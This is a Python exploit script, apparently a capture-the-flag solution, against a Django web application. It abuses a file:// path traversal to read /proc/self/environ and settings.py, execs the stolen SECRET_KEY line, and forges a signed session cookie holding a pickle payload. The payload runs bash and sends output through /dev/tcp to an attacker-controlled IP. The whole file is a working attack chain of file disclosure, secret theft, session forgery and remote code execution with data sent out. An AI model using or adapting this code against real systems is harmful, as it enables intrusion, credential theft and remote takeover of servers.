import mechanize,os
import cPickle as pickle
import socket,random

MYIP = "54.82.108.138"
HOST = "http://54.82.251.203:8000/"

myname = os.urandom(8).encode("hex")+"http:"

br = mechanize.Browser()
br.open(HOST+"register")

reg = list(br.forms())[0]
reg["username"] = myname
reg["password"] = myname

br.open(reg.click())


i = 0
def readfile(path):
  global i
  br.open(HOST+"make")
  mak = list(br.forms())[0]
  mak["url"] = "file:///tmp/memes/%s//../../../%s"%(myname,path)
  mak["text"] = "foo"
  try:
    br.open(mak.click())
  except:
    pass #it will 500, that's okay
  dat = br.open(HOST+"view/%d"%(i%10)).read()
  i+=1
  return dat

environ = readfile("/proc/self/environ")
djpath = filter(lambda x:"PWD" == x[:3], environ.split("\x00"))[0].split("=")[1]

appname = djpath[djpath.rindex("/")+1:]
djbsettings = readfile(djpath + "/" + appname + "/settings.py")
#LOL YES I KNOW, but I wrote the code and I know it doesn't do malicious things here
exec(filter(lambda x:"SECRET_KEY" in x, djbsettings.split("\n"))[0])
exec(filter(lambda x:"SESSION_ENGINE" in x, djbsettings.split("\n"))[0])

import django.core.signing as d

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = random.randint(9000,65000)
s.bind(('0.0.0.0',port))
print "listening on %d"%port
s.listen(5)

pdata = "cos\nsystem\n(S'%s'\ntR." % (" bash -c 'cd /home/reekee/; ./give_me_the_flag.exe > /dev/tcp/%s/%d' "%(MYIP,port))
t = d.TimestampSigner(SECRET_KEY, salt=SESSION_ENGINE).sign(d.b64_encode(pdata))
print t
br = mechanize.Browser()
br.open(HOST)
br.set_cookie("sessionid="+t+";")
try:
  br.open(HOST)
except:
  pass
client, addr = s.accept()
print addr
print client.recv(1024)

